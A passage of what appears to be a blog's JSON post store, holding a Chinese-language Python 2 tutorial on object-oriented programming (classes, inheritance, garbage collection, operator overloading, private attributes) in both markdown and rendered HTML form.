Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n \r\nprint \"Employee.__doc__:\", Employee.__doc__\r\nprint \"Employee.__name__:\", Employee.__name__\r\nprint \"Employee.__module__:\", Employee.__module__\r\nprint \"Employee.__bases__:\", Employee.__bases__\r\nprint \"Employee.__dict__:\", Employee.__dict__\r\n执行以上代码输出结果如下：\r\nEmployee.__doc__: 所有员工的基类\r\nEmployee.__name__: Employee\r\nEmployee.__module__: __main__\r\nEmployee.__bases__: ()\r\nEmployee.__dict__: {'__module__': '__main__', 'displayCount': <function displayCount at 0x10a939c80>, 'empCount': 0, 'displayEmployee': <function displayEmployee at 0x10a93caa0>, '__doc__': '\\xe6\\x89\\x80\\xe6\\x9c\\x89\\xe5\\x91\\x98\\xe5\\xb7\\xa5\\xe7\\x9a\\x84\\xe5\\x9f\\xba\\xe7\\xb1\\xbb', '__init__': <function __init__ at 0x10a939578>}\r\npython对象销毁(垃圾回收)\r\nPython 使用了引用计数这一简单技术来跟踪和回收垃圾。\r\n在 Python 内部记录着所有使用中的对象各有多少引用。\r\n一个内部跟踪变量，称为一个引用计数器。\r\n当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是\"立即\"的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。\r\na = 40      # 创建对象  <40>\r\nb = a       # 增加引用， <40> 的计数\r\nc = [b]     # 增加引用.  <40> 的计数\r\n\r\ndel a       # 减少引用 <40> 的计数\r\nb = 100     # 减少引用 <40> 的计数\r\nc[0] = -1   # 减少引用 <40> 的计数\r\n垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（及未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。\r\n实例\r\n析构函数 __del__ ，__del__在对象销毁的时候被调用，当对象不再被使用时，__del__方法运行：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Point:\r\n   def __init__( self, x=0, y=0):\r\n      self.x = x\r\n      self.y = y\r\n   def __del__(self):\r\n      class_name = self.__class__.__name__\r\n      print class_name, \"销毁\"\r\n \r\npt1 = Point()\r\npt2 = pt1\r\npt3 = pt1\r\nprint id(pt1), id(pt2), id(pt3) # 打印对象的id\r\ndel pt1\r\ndel pt2\r\ndel pt3\r\n以上实例运行结果如下：\r\n3083401324 3083401324 3083401324\r\nPoint 销毁\r\n注意：通常你需要在单独的文件中定义一个类，\r\n类的继承\r\n面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。继承完全可以理解成类之间的类型和子类型关系。\r\n需要注意的地方：继承语法 class 派生类名（基类名）：//... 基类名写在括号里，基本类是在类定义的时候，在元组之中指明的。\r\n在python中继承中的一些特点：\r\n1：在继承中基类的构造（__init__()方法）不会被自动调用，它需要在其派生类的构造中亲自专门调用。\r\n2：在调用基类的方法时，需要加上基类的类名前缀，且需要带上self参数变量。区别于在类中调用普通函数时并不需要带上self参数\r\n3：Python总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找）。\r\n如果在继承元组中列了一个以上的类，那么它就被称作\"多重继承\" 。\r\n语法：\r\n派生类的声明，与他们的父类类似，继承的基类列表跟在类名之后，如下所示：\r\nclass SubClassName (ParentClass1[, ParentClass2, ...]):\r\n   'Optional class documentation string'\r\n   class_suite\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Parent:        # 定义父类\r\n   parentAttr = 100\r\n   def __init__(self):\r\n      print \"调用父类构造函数\"\r\n \r\n   def parentMethod(self):\r\n      print '调用父类方法'\r\n \r\n   def setAttr(self, attr):\r\n      Parent.parentAttr = attr\r\n \r\n   def getAttr(self):\r\n      print \"父类属性 :\", Parent.parentAttr\r\n \r\nclass Child(Parent): # 定义子类\r\n   def __init__(self):\r\n      print \"调用子类构造方法\"\r\n \r\n   def childMethod(self):\r\n      print '调用子类方法 child method'\r\n \r\nc = Child()          # 实例化子类\r\nc.childMethod()      # 调用子类的方法\r\nc.parentMethod()     # 调用父类方法\r\nc.setAttr(200)       # 再次调用父类的方法\r\nc.getAttr()          # 再次调用父类的方法\r\n以上代码执行结果如下：\r\n调用子类构造方法\r\n调用子类方法 child method\r\n调用父类方法\r\n父类属性 : 200\r\n你可以继承多个类\r\nclass A:        # 定义类 A\r\n.....\r\n\r\nclass B:         # 定义类 B\r\n.....\r\n\r\nclass C(A, B):   # 继承类 A 和 B\r\n.....\r\n你可以使用issubclass()或者isinstance()方法来检测。\r\nissubclass() - 布尔函数判断一个类是另一个类的子类或者子孙类，语法：issubclass(sub,sup)\r\nisinstance(obj, Class) 布尔函数如果obj是Class类的实例对象或者是一个Class子类的实例对象则返回true。\r\n方法重写\r\n如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：\r\n实例：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Parent:        # 定义父类\r\n   def myMethod(self):\r\n      print '调用父类方法'\r\n \r\nclass Child(Parent): # 定义子类\r\n   def myMethod(self):\r\n      print '调用子类方法'\r\n \r\nc = Child()          # 子类实例\r\nc.myMethod()         # 子类调用重写方法\r\n执行以上代码输出结果如下：\r\n调用子类方法\r\n基础重载方法\r\n下表列出了一些通用的功能，你可以在自己的类重写：\r\n序号\t方法, 描述 & 简单的调用\r\n1\t__init__ ( self [,args...] )\r\n构造函数\r\n简单的调用方法: obj = className(args)\r\n2\t__del__( self )\r\n析构方法, 删除一个对象\r\n简单的调用方法 : dell obj\r\n3\t__repr__( self )\r\n转化为供解释器读取的形式\r\n简单的调用方法 : repr(obj)\r\n4\t__str__( self )\r\n用于将值转化为适于人阅读的形式\r\n简单的调用方法 : str(obj)\r\n5\t__cmp__ ( self, x )\r\n对象比较\r\n简单的调用方法 : cmp(obj, x)\r\n运算符重载\r\nPython同样支持运算符重载，实例如下：\r\n实例\r\n#!/usr/bin/python\r\n \r\nclass Vector:\r\n   def __init__(self, a, b):\r\n      self.a = a\r\n      self.b = b\r\n \r\n   def __str__(self):\r\n      return 'Vector (%d, %d)' % (self.a, self.b)\r\n   \r\n   def __add__(self,other):\r\n      return Vector(self.a + other.a, self.b + other.b)\r\n \r\nv1 = Vector(2,10)\r\nv2 = Vector(5,-2)\r\nprint v1 + v2\r\n以上代码执行结果如下所示:\r\nVector(7,8)\r\n类属性与方法\r\n类的私有属性\r\n__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。\r\n类的方法\r\n在类地内部，使用def关键字可以为类定义一个方法，与一般函数定义不同，类方法必须包含参数self,且为第一个参数\r\n类的私有方法\r\n__private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用。在类的内部调用 self.__private_methods\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass JustCounter:\r\n    __secretCount = 0  # 私有变量\r\n    publicCount = 0    # 公开变量\r\n \r\n    def count(self):\r\n        self.__secretCount += 1\r\n        self.publicCount += 1\r\n        print self.__secretCount\r\n \r\ncounter = JustCounter()\r\ncounter.count()\r\ncounter.count()\r\nprint counter.publicCount\r\nprint counter.__secretCount  # 报错，实例不能访问私有变量\r\nPython 通过改变名称来包含类名:\r\n1\r\n2\r\n2\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 17, in <module>\r\n    print counter.__secretCount  # 报错，实例不能访问私有变量\r\nAttributeError: JustCounter instance has no attribute '__secretCount'\r\nPython不允许实例化的类访问私有数据，但你可以使用 object._className__attrName 访问属性，将如下代码替换以上代码的最后一行代码：\r\n.........................\r\nprint counter._JustCounter__secretCount\r\n执行以上代码，执行结果如下：\r\n1\r\n2\r\n2\r\n2\r\n单下划线、双下划线、头尾双下划线说明：\r\n__foo__: 定义的是特列方法，类似 __init__() 之类的。\r\n_foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import *\r\n__foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。","source":"_posts/python/Python面向对象.md","raw":"---\ntitle: Python面向对象\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\r\nPython从设计之初就已经是一门面向对象的语言，正因为如此，在Python中创建一个类和对象是很容易的。本章节我们将详细介绍Python的面向对象编程。\r\n如果你以前没有接触过面向对象的编程语言，那你可能需要先了解一些面向对象语言的一些基本特征，在头脑里头形成一个基本的面向对象的概念，这样有助于你更容易的学习Python的面向对象编程。\r\n接下来我们先来简单的了解下面向对象的一些基本特征。\r\n面向对象技术简介\r\n类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。\r\n类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。\r\n数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。\r\n方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。\r\n实例变量：定义在方法中的变量，只作用于当前实例的类。\r\n继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟\"是一个（is-a）\"关系（例图，Dog是一个Animal）。\r\n实例化：创建一个类的实例，类的具体对象。\r\n方法：类中定义的函数。\r\n对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。\r\n创建类\r\n使用class语句来创建一个新类，class之后为类的名称并以冒号结尾，如下实例:\r\nclass ClassName:\r\n   '类的帮助信息'   #类文档字符串\r\n   class_suite  #类体\r\n类的帮助信息可以通过ClassName.__doc__查看。\r\nclass_suite 由类成员，方法，数据属性组成。\r\n实例\r\n以下是一个简单的Python类实例:\r\n实例\r\n#!/usr/bin/python\r\n\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n      \r\nempCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。\r\n第一种方法__init__()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法\r\nself 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。\r\nself代表类的实例，而非类\r\n类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。\r\nclass Test:\r\n    def prt(self):\r\n        print(self)\r\n        print(self.__class__)\r\n \r\nt = Test()\r\nt.prt()\r\n以上实例执行结果为：\r\n<__main__.Test instance at 0x10d066878>\r\n__main__.Test\r\n从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。\r\nself 不是 python 关键字，我们把他换成 runoob 也是可以正常执行的:\r\n实例\r\nclass Test:\r\n    def prt(runoob):\r\n        print(runoob)\r\n        print(runoob.__class__)\r\n \r\nt = Test()\r\nt.prt()\r\n以上实例执行结果为：\r\n<__main__.Test instance at 0x10d066878>\r\n__main__.Test\r\n创建实例对象\r\n实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。\r\n以下使用类的名称 Employee 来实例化，并通过 __init__ 方法接受参数。\r\n\"创建 Employee 类的第一个对象\"\r\nemp1 = Employee(\"Zara\", 2000)\r\n\"创建 Employee 类的第二个对象\"\r\nemp2 = Employee(\"Manni\", 5000)\r\n访问属性\r\n您可以使用点(.)来访问对象的属性。使用如下类的名称访问类变量:\r\nemp1.displayEmployee()\r\nemp2.displayEmployee()\r\nprint \"Total Employee %d\" % Employee.empCount\r\n完整实例：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n \r\n\"创建 Employee 类的第一个对象\"\r\nemp1 = Employee(\"Zara\", 2000)\r\n\"创建 Employee 类的第二个对象\"\r\nemp2 = Employee(\"Manni\", 5000)\r\nemp1.displayEmployee()\r\nemp2.displayEmployee()\r\nprint \"Total Employee %d\" % Employee.empCount\r\n执行以上代码输出结果如下：\r\nName :  Zara ,Salary:  2000\r\nName :  Manni ,Salary:  5000\r\nTotal Employee 2\r\n你可以添加，删除，修改类的属性，如下所示：\r\nemp1.age = 7  # 添加一个 'age' 属性\r\nemp1.age = 8  # 修改 'age' 属性\r\ndel emp1.age  # 删除 'age' 属性\r\n你也可以使用以下函数的方式来访问属性：\r\ngetattr(obj, name[, default]) : 访问对象的属性。\r\nhasattr(obj,name) : 检查是否存在一个属性。\r\nsetattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。\r\ndelattr(obj, name) : 删除属性。\r\nhasattr(emp1, 'age')    # 如果存在 'age' 属性返回 True。\r\ngetattr(emp1, 'age')    # 返回 'age' 属性的值\r\nsetattr(emp1, 'age', 8) # 添加属性 'age' 值为 8\r\ndelattr(empl, 'age')    # 删除属性 'age'\r\nPython内置类属性\r\n__dict__ : 类的属性（包含一个字典，由类的数据属性组成）\r\n__doc__ :类的文档字符串\r\n__name__: 类名\r\n__module__: 类定义所在的模块（类的全名是'__main__.className'，如果类位于一个导入模块mymod中，那么className.__module__ 等于 mymod）\r\n__bases__ : 类的所有父类构成元素（包含了一个由所有父类组成的元组）\r\nPython内置类属性调用实例如下：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Employee:\r\n   '所有员工的基类'\r\n   empCount = 0\r\n \r\n   def __init__(self, name, salary):\r\n      self.name = name\r\n      self.salary = salary\r\n      Employee.empCount += 1\r\n   \r\n   def displayCount(self):\r\n     print \"Total Employee %d\" % Employee.empCount\r\n \r\n   def displayEmployee(self):\r\n      print \"Name : \", self.name,  \", Salary: \", self.salary\r\n \r\nprint \"Employee.__doc__:\", Employee.__doc__\r\nprint \"Employee.__name__:\", Employee.__name__\r\nprint \"Employee.__module__:\", Employee.__module__\r\nprint \"Employee.__bases__:\", Employee.__bases__\r\nprint \"Employee.__dict__:\", Employee.__dict__\r\n执行以上代码输出结果如下：\r\nEmployee.__doc__: 所有员工的基类\r\nEmployee.__name__: Employee\r\nEmployee.__module__: __main__\r\nEmployee.__bases__: ()\r\nEmployee.__dict__: {'__module__': '__main__', 'displayCount': <function displayCount at 0x10a939c80>, 'empCount': 0, 'displayEmployee': <function displayEmployee at 0x10a93caa0>, '__doc__': '\\xe6\\x89\\x80\\xe6\\x9c\\x89\\xe5\\x91\\x98\\xe5\\xb7\\xa5\\xe7\\x9a\\x84\\xe5\\x9f\\xba\\xe7\\xb1\\xbb', '__init__': <function __init__ at 0x10a939578>}\r\npython对象销毁(垃圾回收)\r\nPython 使用了引用计数这一简单技术来跟踪和回收垃圾。\r\n在 Python 内部记录着所有使用中的对象各有多少引用。\r\n一个内部跟踪变量，称为一个引用计数器。\r\n当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是\"立即\"的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。\r\na = 40      # 创建对象  <40>\r\nb = a       # 增加引用， <40> 的计数\r\nc = [b]     # 增加引用.  <40> 的计数\r\n\r\ndel a       # 减少引用 <40> 的计数\r\nb = 100     # 减少引用 <40> 的计数\r\nc[0] = -1   # 减少引用 <40> 的计数\r\n垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（及未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。\r\n实例\r\n析构函数 __del__ ，__del__在对象销毁的时候被调用，当对象不再被使用时，__del__方法运行：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Point:\r\n   def __init__( self, x=0, y=0):\r\n      self.x = x\r\n      self.y = y\r\n   def __del__(self):\r\n      class_name = self.__class__.__name__\r\n      print class_name, \"销毁\"\r\n \r\npt1 = Point()\r\npt2 = pt1\r\npt3 = pt1\r\nprint id(pt1), id(pt2), id(pt3) # 打印对象的id\r\ndel pt1\r\ndel pt2\r\ndel pt3\r\n以上实例运行结果如下：\r\n3083401324 3083401324 3083401324\r\nPoint 销毁\r\n注意：通常你需要在单独的文件中定义一个类，\r\n类的继承\r\n面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。继承完全可以理解成类之间的类型和子类型关系。\r\n需要注意的地方：继承语法 class 派生类名（基类名）：//... 基类名写在括号里，基本类是在类定义的时候，在元组之中指明的。\r\n在python中继承中的一些特点：\r\n1：在继承中基类的构造（__init__()方法）不会被自动调用，它需要在其派生类的构造中亲自专门调用。\r\n2：在调用基类的方法时，需要加上基类的类名前缀，且需要带上self参数变量。区别于在类中调用普通函数时并不需要带上self参数\r\n3：Python总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找）。\r\n如果在继承元组中列了一个以上的类，那么它就被称作\"多重继承\" 。\r\n语法：\r\n派生类的声明，与他们的父类类似，继承的基类列表跟在类名之后，如下所示：\r\nclass SubClassName (ParentClass1[, ParentClass2, ...]):\r\n   'Optional class documentation string'\r\n   class_suite\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Parent:        # 定义父类\r\n   parentAttr = 100\r\n   def __init__(self):\r\n      print \"调用父类构造函数\"\r\n \r\n   def parentMethod(self):\r\n      print '调用父类方法'\r\n \r\n   def setAttr(self, attr):\r\n      Parent.parentAttr = attr\r\n \r\n   def getAttr(self):\r\n      print \"父类属性 :\", Parent.parentAttr\r\n \r\nclass Child(Parent): # 定义子类\r\n   def __init__(self):\r\n      print \"调用子类构造方法\"\r\n \r\n   def childMethod(self):\r\n      print '调用子类方法 child method'\r\n \r\nc = Child()          # 实例化子类\r\nc.childMethod()      # 调用子类的方法\r\nc.parentMethod()     # 调用父类方法\r\nc.setAttr(200)       # 再次调用父类的方法\r\nc.getAttr()          # 再次调用父类的方法\r\n以上代码执行结果如下：\r\n调用子类构造方法\r\n调用子类方法 child method\r\n调用父类方法\r\n父类属性 : 200\r\n你可以继承多个类\r\nclass A:        # 定义类 A\r\n.....\r\n\r\nclass B:         # 定义类 B\r\n.....\r\n\r\nclass C(A, B):   # 继承类 A 和 B\r\n.....\r\n你可以使用issubclass()或者isinstance()方法来检测。\r\nissubclass() - 布尔函数判断一个类是另一个类的子类或者子孙类，语法：issubclass(sub,sup)\r\nisinstance(obj, Class) 布尔函数如果obj是Class类的实例对象或者是一个Class子类的实例对象则返回true。\r\n方法重写\r\n如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法：\r\n实例：\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass Parent:        # 定义父类\r\n   def myMethod(self):\r\n      print '调用父类方法'\r\n \r\nclass Child(Parent): # 定义子类\r\n   def myMethod(self):\r\n      print '调用子类方法'\r\n \r\nc = Child()          # 子类实例\r\nc.myMethod()         # 子类调用重写方法\r\n执行以上代码输出结果如下：\r\n调用子类方法\r\n基础重载方法\r\n下表列出了一些通用的功能，你可以在自己的类重写：\r\n序号\t方法, 描述 & 简单的调用\r\n1\t__init__ ( self [,args...] )\r\n构造函数\r\n简单的调用方法: obj = className(args)\r\n2\t__del__( self )\r\n析构方法, 删除一个对象\r\n简单的调用方法 : dell obj\r\n3\t__repr__( self )\r\n转化为供解释器读取的形式\r\n简单的调用方法 : repr(obj)\r\n4\t__str__( self )\r\n用于将值转化为适于人阅读的形式\r\n简单的调用方法 : str(obj)\r\n5\t__cmp__ ( self, x )\r\n对象比较\r\n简单的调用方法 : cmp(obj, x)\r\n运算符重载\r\nPython同样支持运算符重载，实例如下：\r\n实例\r\n#!/usr/bin/python\r\n \r\nclass Vector:\r\n   def __init__(self, a, b):\r\n      self.a = a\r\n      self.b = b\r\n \r\n   def __str__(self):\r\n      return 'Vector (%d, %d)' % (self.a, self.b)\r\n   \r\n   def __add__(self,other):\r\n      return Vector(self.a + other.a, self.b + other.b)\r\n \r\nv1 = Vector(2,10)\r\nv2 = Vector(5,-2)\r\nprint v1 + v2\r\n以上代码执行结果如下所示:\r\nVector(7,8)\r\n类属性与方法\r\n类的私有属性\r\n__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。\r\n类的方法\r\n在类地内部，使用def关键字可以为类定义一个方法，与一般函数定义不同，类方法必须包含参数self,且为第一个参数\r\n类的私有方法\r\n__private_method：两个下划线开头，声明该方法为私有方法，不能在类地外部调用。在类的内部调用 self.__private_methods\r\n实例\r\n#!/usr/bin/python\r\n# -*- coding: UTF-8 -*-\r\n \r\nclass JustCounter:\r\n    __secretCount = 0  # 私有变量\r\n    publicCount = 0    # 公开变量\r\n \r\n    def count(self):\r\n        self.__secretCount += 1\r\n        self.publicCount += 1\r\n        print self.__secretCount\r\n \r\ncounter = JustCounter()\r\ncounter.count()\r\ncounter.count()\r\nprint counter.publicCount\r\nprint counter.__secretCount  # 报错，实例不能访问私有变量\r\nPython 通过改变名称来包含类名:\r\n1\r\n2\r\n2\r\nTraceback (most recent call last):\r\n  File \"test.py\", line 17, in <module>\r\n    print counter.__secretCount  # 报错，实例不能访问私有变量\r\nAttributeError: JustCounter instance has no attribute '__secretCount'\r\nPython不允许实例化的类访问私有数据，但你可以使用 object._className__attrName 访问属性，将如下代码替换以上代码的最后一行代码：\r\n.........................\r\nprint counter._JustCounter__secretCount\r\n执行以上代码，执行结果如下：\r\n1\r\n2\r\n2\r\n2\r\n单下划线、双下划线、头尾双下划线说明：\r\n__foo__: 定义的是特列方法，类似 __init__() 之类的。\r\n_foo: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 from module import *\r\n__foo: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。","slug":"python/Python面向对象","published":1,"updated":"2018-07-10T13:10:09.961Z","_id":"cjjedmhb800690gtj0d0h45j4","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>Python从设计之初就已经是一门面向对象的语言，正因为如此，在Python中创建一个类和对象是很容易的。本章节我们将详细介绍Python的面向对象编程。<br>如果你以前没有接触过面向对象的编程语言，那你可能需要先了解一些面向对象语言的一些基本特征，在头脑里头形成一个基本的面向对象的概念，这样有助于你更容易的学习Python的面向对象编程。<br>接下来我们先来简单的了解下面向对象的一些基本特征。<br>面向对象技术简介<br>类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。<br>类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。<br>数据成员：类变量或者实例变量用于处理类及其实例对象的相关的数据。<br>方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br>实例变量：定义在方法中的变量，只作用于当前实例的类。<br>继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。<br>实例化：创建一个类的实例，类的具体对象。<br>方法：类中定义的函数。<br>对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。<br>创建类<br>使用class语句来创建一个新类，class之后为类的名称并以冒号结尾，如下实例:<br>class ClassName:<br>   ‘类的帮助信息’   #类文档字符串<br>   class_suite  #类体<br>类的帮助信息可以通过ClassName.<strong>doc</strong>查看。<br>class_suite 由类成员，方法，数据属性组成。<br>实例<br>以下是一个简单的Python类实例:<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8\"><a href=\"#coding-UTF-8\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>empCount 变量是一个类变量，它的值将在这个类的所有实例之间共享。你可以在内部类或外部类使用 Employee.empCount 访问。<br>第一种方法<strong>init</strong>()方法是一种特殊的方法，被称为类的构造函数或初始化方法，当创建了这个类的实例时就会调用该方法<br>self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。<br>self代表类的实例，而非类<br>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的第一个参数名称, 按照惯例它的名称是 self。<br>class Test:<br>    def prt(self):<br>        print(self)<br>        print(self.<strong>class</strong>)</p>\n<p>t = Test()<br>t.prt()<br>以上实例执行结果为：</p>\n<p>&lt;<strong>main</strong>.Test instance at 0x10d066878&gt;<br><strong>main</strong>.Test<br>从执行结果可以很明显的看出，self 代表的是类的实例，代表当前对象的地址，而 self.class 则指向类。<br>self 不是 python 关键字，我们把他换成 runoob 也是可以正常执行的:<br>实例<br>class Test:<br>    def prt(runoob):<br>        print(runoob)<br>        print(runoob.<strong>class</strong>)</p>\n<p>t = Test()<br>t.prt()<br>以上实例执行结果为：</p>\n<p>&lt;<strong>main</strong>.Test instance at 0x10d066878&gt;<br><strong>main</strong>.Test<br>创建实例对象<br>实例化类其他编程语言中一般用关键字 new，但是在 Python 中并没有这个关键字，类的实例化类似函数调用方式。<br>以下使用类的名称 Employee 来实例化，并通过 <strong>init</strong> 方法接受参数。<br>“创建 Employee 类的第一个对象”<br>emp1 = Employee(“Zara”, 2000)<br>“创建 Employee 类的第二个对象”<br>emp2 = Employee(“Manni”, 5000)<br>访问属性<br>您可以使用点(.)来访问对象的属性。使用如下类的名称访问类变量:<br>emp1.displayEmployee()<br>emp2.displayEmployee()<br>print “Total Employee %d” % Employee.empCount<br>完整实例：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-1\"><a href=\"#coding-UTF-8-1\" class=\"headerlink\" title=\"-- coding: UTF-8 --\"></a>-<em>- coding: UTF-8 -</em>-</h1><p>class Employee:<br>   ‘所有员工的基类’<br>   empCount = 0</p>\n<p>   def <strong>init</strong>(self, name, salary):<br>      self.name = name<br>      self.salary = salary<br>      Employee.empCount += 1</p>\n<p>   def displayCount(self):<br>     print “Total Employee %d” % Employee.empCount</p>\n<p>   def displayEmployee(self):<br>      print “Name : “, self.name,  “, Salary: “, self.salary</p>\n<p>“创建 Employee 类的第一个对象”<br>emp1 = Employee(“Zara”, 2000)<br>“创建 Employee 类的第二个对象”<br>emp2 = Employee(“Manni”, 5000)<br>emp1.displayEmployee()<br>emp2.displayEmployee()<br>print “Total Employee %d” % Employee.empCount<br>执行以上代码输出结果如下：<br>Name :  Zara ,Salary:  2000<br>Name :  Manni ,Salary:  5000<br>Total Employee 2<br>你可以添加，删除，修改类的属性，如下所示：<br>emp1.age = 7  # 添加一个 ‘age’ 属性<br>emp1.age = 8  # 修改 ‘age’ 属性<br>del emp1.age  # 删除 ‘age’ 属性<br>你也可以使用以下函数的方式来访问属性：<br>getattr(obj, name[, default]) : 访问对象的属性。<br>hasattr(obj,name) : 检查是否存在一个属性。<br>setattr(obj,name,value) : 设置一个属性。如果属性不存在，会创建一个新属性。<br>delattr(obj, name) : 删除属性。<br>hasattr(emp1, ‘age’)    # 如果存在 ‘age’ 属性返回 True。<br>getattr(emp1, ‘age’)    # 返回 ‘age’ 属性的值<br>setattr(emp1, ‘age’, 8) # 添加属性 ‘age’ 值为 8<br>delattr(empl, ‘age’)    # 删除属性 ‘age’<br>Python内置类属性<br><strong>dict</strong> : 类的属性（包含一个字典，由类的数据属性组成）<br><strong>doc</strong> :类的文档字符串<br><strong>name</strong>: 类名<br><strong>module</strong>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）<br><strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）<br>Python内置类属性调用实例如下：<br>实例</p>\n<p>#!/usr/bin/python</p>\n<h1 id=\"coding-UTF-8-2\"><a href=\"#coding-UTF-8-2\" class=\"headerlink\" title=\"-- coding: 